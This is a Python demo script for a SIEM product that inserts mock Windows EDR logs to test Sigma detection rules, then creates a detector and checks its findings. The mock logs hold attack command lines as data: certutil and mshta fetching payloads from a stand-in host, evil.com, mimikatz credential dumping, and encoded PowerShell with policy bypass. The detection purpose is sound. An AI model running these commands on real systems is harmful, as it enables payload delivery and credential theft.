#!/usr/bin/env python3
"""
Standard(Sigma) 규칙 기반 디텍터 데모 스크립트
변환 성공한 Sigma 규칙을 찾아 → 매칭되는 목업 로그 삽입 → Detector 생성 → 탐지 실행

사용법:
    cd backend
    python scripts/demo_sigma_detection.py
"""

import asyncio
import json
import logging
import os
import sys
import uuid
from datetime import datetime, timezone, timedelta

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.core.opensearch import get_opensearch_client

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

RULES_INDEX = "cs_detection_rules"
DETECTORS_INDEX = "cs_detection_policies"
FINDINGS_INDEX = "cs_detection_events"
LOGS_INDEX = "logs-sentinel_one.edr"
DEMO_TAG = "demo-sigma"


def get_client():
    return get_opensearch_client()


# ── Step 1: 탐지 가능한 Sigma 규칙 선별 ──────────────────────────────────

SIGMA_RULE_QUERIES = [
    {
        "search_keyword": "mimikatz",
        "mock_logs_fn": "mock_mimikatz_logs",
        "description": "Mimikatz 실행 탐지 (Sigma)",
    },
    {
        "search_keyword": "encoded powershell",
        "mock_logs_fn": "mock_encoded_powershell_logs",
        "description": "인코딩된 PowerShell 탐지 (Sigma)",
    },
    {
        "search_keyword": "certutil",
        "mock_logs_fn": "mock_certutil_logs",
        "description": "Certutil 악용 탐지 (Sigma)",
    },
    {
        "search_keyword": "whoami",
        "mock_logs_fn": "mock_whoami_logs",
        "description": "Whoami 정찰 탐지 (Sigma)",
    },
    {
        "search_keyword": "mshta",
        "mock_logs_fn": "mock_mshta_logs",
        "description": "Mshta 실행 탐지 (Sigma)",
    },
]


def find_sigma_rules(client, max_rules=5):
    """변환 성공한 Sigma 규칙 중 매칭 가능한 규칙들을 선별"""
    logger.info("=== Step 1: 탐지 가능한 Sigma 규칙 검색 ===")

    selected = []
    for item in SIGMA_RULE_QUERIES:
        if len(selected) >= max_rules:
            break

        result = client.search(
            index=RULES_INDEX,
            body={
                "query": {
                    "bool": {
                        "must": [
                            {"term": {"type": "sigma"}},
                            {"term": {"query_conversion_status": "success"}},
                            {"term": {"status": "active"}},
                            {"match": {"name": item["search_keyword"]}},
                        ]
                    }
                },
                "size": 1,
                "sort": [{"name.keyword": {"order": "asc"}}],
            },
        )

        hits = result.get("hits", {}).get("hits", [])
        if hits:
            rule = hits[0]["_source"]
            selected.append({
                "rule": rule,
                "mock_fn": item["mock_logs_fn"],
                "description": item["description"],
            })
            logger.info(f"  ✓ [{rule['level_normalized']:>8}] {rule['name'][:70]}")
            logger.info(f"    ID: {rule['id'][:12]}...  pipeline: {rule.get('query_pipeline_id', '-')}")

    if not selected:
        logger.error("  ✗ 변환 성공한 Sigma 규칙을 찾을 수 없습니다. import_sigma.py와 reconvert_rules.py를 먼저 실행하세요.")

    logger.info(f"  → {len(selected)}개 규칙 선별 완료\n")
    return selected


# ── Step 2: 목업 로그 생성 ────────────────────────────────────────────────

def make_base_log(ts_offset_sec=0):
    now = datetime.now(timezone.utc)
    ts = now - timedelta(seconds=ts_offset_sec)
    return {
        "@timestamp": ts.isoformat(),
        "demo_tag": DEMO_TAG,
        "endpoint": {"name": "DESKTOP-SIGMA01", "os": "Windows 11 Pro", "type": "desktop"},
        "event": {"type": "Process Creation", "category": "process"},
    }


def mock_mimikatz_logs():
    logs = []
    log = make_base_log(30)
    log["src"] = {
        "process": {
            "name": "mimikatz.exe",
            "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
            "pid": 8801,
            "user": "admin",
            "image": {"path": "C:\\Users\\admin\\Downloads\\mimikatz.exe"},
            "parent": {"name": "cmd.exe", "cmdline": "cmd.exe /c mimikatz.exe", "image": {"path": "C:\\Windows\\System32\\cmd.exe"}},
            "signedStatus": "unsigned",
            "integrityLevel": "high",
        }
    }
    logs.append(log)

    log2 = make_base_log(20)
    log2["src"] = {
        "process": {
            "name": "mimikatz.exe",
            "cmdline": 'mimikatz.exe "lsadump::sam" exit',
            "pid": 8802,
            "user": "SYSTEM",
            "image": {"path": "C:\\Temp\\mimi\\mimikatz.exe"},
            "parent": {"name": "powershell.exe", "cmdline": "powershell.exe", "image": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}},
            "signedStatus": "unsigned",
            "integrityLevel": "system",
        }
    }
    logs.append(log2)
    return logs


def mock_encoded_powershell_logs():
    logs = []
    log = make_base_log(60)
    log["src"] = {
        "process": {
            "name": "powershell.exe",
            "cmdline": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0 -NoProfile -WindowStyle Hidden",
            "pid": 9901,
            "user": "admin",
            "image": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            "parent": {"name": "explorer.exe", "cmdline": "explorer.exe", "image": {"path": "C:\\Windows\\explorer.exe"}},
            "signedStatus": "signed",
            "integrityLevel": "medium",
        }
    }
    logs.append(log)

    log2 = make_base_log(50)
    log2["src"] = {
        "process": {
            "name": "powershell.exe",
            "cmdline": "powershell.exe -enc WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQ -ep bypass",
            "pid": 9902,
            "user": "admin",
            "image": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            "parent": {"name": "wscript.exe", "cmdline": "wscript.exe dropper.vbs", "image": {"path": "C:\\Windows\\System32\\wscript.exe"}},
            "signedStatus": "signed",
            "integrityLevel": "medium",
        }
    }
    logs.append(log2)
    return logs


def mock_certutil_logs():
    logs = []
    log = make_base_log(90)
    log["src"] = {
        "process": {
            "name": "certutil.exe",
            "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
            "pid": 7701,
            "user": "admin",
            "image": {"path": "C:\\Windows\\System32\\certutil.exe"},
            "parent": {"name": "cmd.exe", "cmdline": "cmd.exe /c certutil", "image": {"path": "C:\\Windows\\System32\\cmd.exe"}},
            "signedStatus": "signed",
            "integrityLevel": "medium",
        }
    }
    logs.append(log)

    log2 = make_base_log(80)
    log2["src"] = {
        "process": {
            "name": "certutil.exe",
            "cmdline": "certutil -decode encoded.b64 malware.exe",
            "pid": 7702,
            "user": "admin",
            "image": {"path": "C:\\Windows\\System32\\certutil.exe"},
            "parent": {"name": "powershell.exe", "cmdline": "powershell.exe", "image": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}},
            "signedStatus": "signed",
            "integrityLevel": "medium",
        }
    }
    logs.append(log2)
    return logs


def mock_whoami_logs():
    logs = []
    log = make_base_log(120)
    log["src"] = {
        "process": {
            "name": "whoami.exe",
            "cmdline": "whoami /priv",
            "pid": 6601,
            "user": "admin",
            "image": {"path": "C:\\Windows\\System32\\whoami.exe"},
            "parent": {"name": "powershell.exe", "cmdline": "powershell.exe", "image": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}},
            "signedStatus": "signed",
            "integrityLevel": "medium",
        }
    }
    logs.append(log)
    return logs


def mock_mshta_logs():
    logs = []
    log = make_base_log(150)
    log["src"] = {
        "process": {
            "name": "mshta.exe",
            "cmdline": "mshta.exe javascript:a=GetObject('script:http://evil.com/payload.sct')",
            "pid": 5501,
            "user": "admin",
            "image": {"path": "C:\\Windows\\System32\\mshta.exe"},
            "parent": {"name": "explorer.exe", "cmdline": "explorer.exe", "image": {"path": "C:\\Windows\\explorer.exe"}},
            "signedStatus": "signed",
            "integrityLevel": "medium",
        }
    }
    logs.append(log)
    return logs


MOCK_LOG_FUNCTIONS = {
    "mock_mimikatz_logs": mock_mimikatz_logs,
    "mock_encoded_powershell_logs": mock_encoded_powershell_logs,
    "mock_certutil_logs": mock_certutil_logs,
    "mock_whoami_logs": mock_whoami_logs,
    "mock_mshta_logs": mock_mshta_logs,
}


def insert_mock_logs(client, selected_rules):
    """선별된 규칙에 매칭될 수 있는 목업 로그를 삽입"""
    logger.info("=== Step 2: 목업 로그 삽입 ===")
    total_inserted = 0

    for item in selected_rules:
        fn = MOCK_LOG_FUNCTIONS.get(item["mock_fn"])
        if not fn:
            continue
        logs = fn()
        for log in logs:
            try:
                client.index(index=LOGS_INDEX, body=log, refresh=False)
                total_inserted += 1
                proc = log.get("src", {}).get("process", {})
                logger.info(f"  ✓ [{proc.get('name', '?')}] {(proc.get('cmdline', '') or '')[:70]}...")
            except Exception as e:
                logger.error(f"  ✗ 로그 삽입 실패: {e}")

    if total_inserted:
        client.indices.refresh(index=LOGS_INDEX)
    logger.info(f"  → {total_inserted}건 삽입 완료\n")
    return total_inserted


# ── Step 3: Sigma 기반 Detector 생성 ──────────────────────────────────────

def create_detector(client, rule_ids):
    """Sigma 규칙들을 연결한 Detector 생성"""
    logger.info("=== Step 3: Detector 생성 (Sigma 규칙 기반) ===")
    now = datetime.now(timezone.utc).isoformat()

    detector_id = str(uuid.uuid4())
    detector = {
        "id": detector_id,
        "name": "[Demo] Sigma 기반 Windows 위협 탐지",
        "description": "Standard(Sigma) 규칙에 의한 자동 탐지 데모 — mimikatz, encoded powershell, certutil, whoami, mshta",
        "detector_type": "windows",
        "target_indices": [LOGS_INDEX],
        "linked_rule_ids": rule_ids,
        "field_mappings": [],
        "schedule_interval_min": 5,
        "trigger_condition": "total > 0",
        "message_template": "[{{severity}}] {{name}}: {{total}}건 탐지 — {{rule_name}}",
        "severity": "high",
        "is_active": True,
        "timestamp_field": "@timestamp",
        "max_search_window_min": 60,
        "total_findings_count": 0,
        "created_by": "demo-sigma-script",
        "created_at": now,
        "updated_at": now,
        "demo_tag": DEMO_TAG,
    }

    try:
        client.index(index=DETECTORS_INDEX, id=detector_id, body=detector, refresh=True)
        logger.info(f"  ✓ Detector: {detector['name']}")
        logger.info(f"    ID: {detector_id[:12]}...")
        logger.info(f"    연결 규칙: {len(rule_ids)}개 (모두 Sigma/Standard)")
        logger.info(f"    대상 인덱스: {LOGS_INDEX}\n")
    except Exception as e:
        logger.error(f"  ✗ Detector 생성 실패: {e}")
        return None

    return detector_id


# ── Step 4: 탐지 실행 ────────────────────────────────────────────────────

async def run_detection(detector_id):
    """Detector를 수동으로 실행하여 탐지"""
    logger.info("=== Step 4: 탐지 실행 (Sigma 규칙) ===")

    from app.services.detection_policy import DetectionPolicyService
    service = DetectionPolicyService()

    detector = await service.get_detector(detector_id)
    if not detector:
        logger.error("  ✗ Detector를 찾을 수 없습니다")
        return None

    logger.info(f"  Detector: {detector['name']}")
    logger.info(f"  연결 규칙: {len(detector.get('linked_rule_ids', []))}개")
    logger.info(f"  실행 중...")

    result = await service.run_detection_for_detector(detector)

    if result:
        report = result.get("report", {})
        findings = result.get("findings", [])
        logger.info(f"  ✓ 탐지 완료!")
        logger.info(f"    실행: {report.get('executed', 0)}개 규칙")
        logger.info(f"    스킵: {report.get('skipped', 0)}개 규칙")
        logger.info(f"    실패: {report.get('failed', 0)}개 규칙")
        logger.info(f"    Finding: {len(findings)}건 생성")

        if report.get("skipped_rules"):
            logger.info(f"    스킵된 규칙:")
            for sr in report["skipped_rules"]:
                logger.info(f"      - {sr.get('rule_id', '?')[:12]}... : {sr.get('reason', '?')}")

        for i, f in enumerate(findings, 1):
            logger.info(f"\n    ── Finding #{i} ──")
            logger.info(f"    규칙: {f.get('rule_name', '?')}")
            logger.info(f"    심각도: {f.get('severity', '?')}")
            logger.info(f"    매칭: {f.get('matched_count', 0)}건")
            logger.info(f"    메시지: {f.get('message', '?')}")
    else:
        logger.info("  → 탐지 결과 없음 (매칭 로그 없음)\n")

    return result


# ── Step 5: Finding 확인 ──────────────────────────────────────────────────

def verify_findings(client, detector_id):
    """생성된 Finding 확인"""
    logger.info("\n=== Step 5: Finding 확인 ===")

    result = client.search(
        index=FINDINGS_INDEX,
        body={
            "query": {"term": {"detector_id.keyword": detector_id}},
            "sort": [{"created_at": {"order": "desc"}}],
            "size": 20,
        },
    )

    hits = result.get("hits", {}).get("hits", [])
    total = result.get("hits", {}).get("total", {}).get("value", 0)

    logger.info(f"  총 Finding: {total}건\n")

    for i, hit in enumerate(hits, 1):
        src = hit["_source"]
        logger.info(f"  [{i}] {src.get('rule_name', '?')}")
        logger.info(f"      심각도: {src.get('severity', '?')}")
        logger.info(f"      매칭: {src.get('matched_count', 0)}건")
        logger.info(f"      상태: {src.get('status', '?')}")
        logger.info(f"      메시지: {src.get('message', '?')}")
        if src.get("sample_events"):
            logger.info(f"      샘플 이벤트:")
            for evt in src["sample_events"][:2]:
                proc = evt.get("src", {}).get("process", {})
                logger.info(f"        - {proc.get('name', '?')}: {(proc.get('cmdline', '?') or '?')[:80]}")
        logger.info("")

    return total


# ── Cleanup ───────────────────────────────────────────────────────────────

def cleanup(client, detector_id):
    """데모 데이터 정리"""
    logger.info("=== Cleanup: 데모 데이터 정리 ===")

    try:
        r = client.delete_by_query(index=LOGS_INDEX, body={"query": {"term": {"demo_tag": DEMO_TAG}}})
        logger.info(f"  ✓ 목업 로그 {r.get('deleted', 0)}건 삭제")
    except Exception as e:
        logger.warning(f"  ⚠ 로그 삭제 실패: {e}")

    if detector_id:
        try:
            client.delete(index=DETECTORS_INDEX, id=detector_id)
            logger.info(f"  ✓ Detector 삭제")
        except Exception:
            pass

        try:
            r = client.delete_by_query(index=FINDINGS_INDEX, body={"query": {"term": {"detector_id.keyword": detector_id}}})
            logger.info(f"  ✓ Finding {r.get('deleted', 0)}건 삭제")
        except Exception as e:
            logger.warning(f"  ⚠ Finding 삭제 실패: {e}")

    for idx in [LOGS_INDEX, DETECTORS_INDEX, FINDINGS_INDEX]:
        try:
            client.indices.refresh(index=idx)
        except Exception:
            pass

    logger.info("  → 정리 완료\n")


# ── Main ──────────────────────────────────────────────────────────────────

async def main():
    print()
    print("=" * 70)
    print("  CruxSIEM Sigma(Standard) 규칙 기반 탐지 데모")
    print("  Sigma 규칙 검색 → 목업 로그 → Detector 생성 → 탐지 → Finding")
    print("=" * 70)
    print()

    client = get_client()

    # Step 1: Sigma 규칙 검색
    selected_rules = find_sigma_rules(client, max_rules=5)
    if not selected_rules:
        return

    rule_ids = [item["rule"]["id"] for item in selected_rules]

    # Step 2: 목업 로그 삽입
    inserted = insert_mock_logs(client, selected_rules)
    if inserted == 0:
        logger.error("로그 삽입 실패. 종료합니다.")
        return

    # Step 3: Detector 생성
    detector_id = create_detector(client, rule_ids)
    if not detector_id:
        return

    # Step 4: 탐지 실행
    result = await run_detection(detector_id)

    # Step 5: Finding 확인
    finding_count = verify_findings(client, detector_id)

    print()
    print("=" * 70)
    if finding_count > 0:
        print(f"  ✅ 성공! Sigma 규칙으로 {finding_count}건의 Finding이 생성되었습니다.")
        print(f"  → 브라우저 탐지 이벤트 메뉴에서 확인하세요!")
    else:
        print("  ⚠ Finding이 생성되지 않았습니다.")
        print("  → Sigma 규칙의 opensearch_query가 목업 로그 필드와 정확히 일치하는지 확인하세요.")
    print(f"\n  Detector ID: {detector_id}")
    print(f"  Sigma Rule IDs: {rule_ids}")
    print("=" * 70)
    print()

    answer = input("데모 데이터를 정리하시겠습니까? (y/N): ").strip().lower()
    if answer == "y":
        cleanup(client, detector_id)
    else:
        print(f"\n  데모 데이터를 유지합니다.")
        print(f"  나중에 정리하려면: python scripts/demo_sigma_detection.py --cleanup {detector_id}\n")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--cleanup" and len(sys.argv) > 2:
        client = get_client()
        cleanup(client, sys.argv[2])
    else:
        asyncio.run(main())
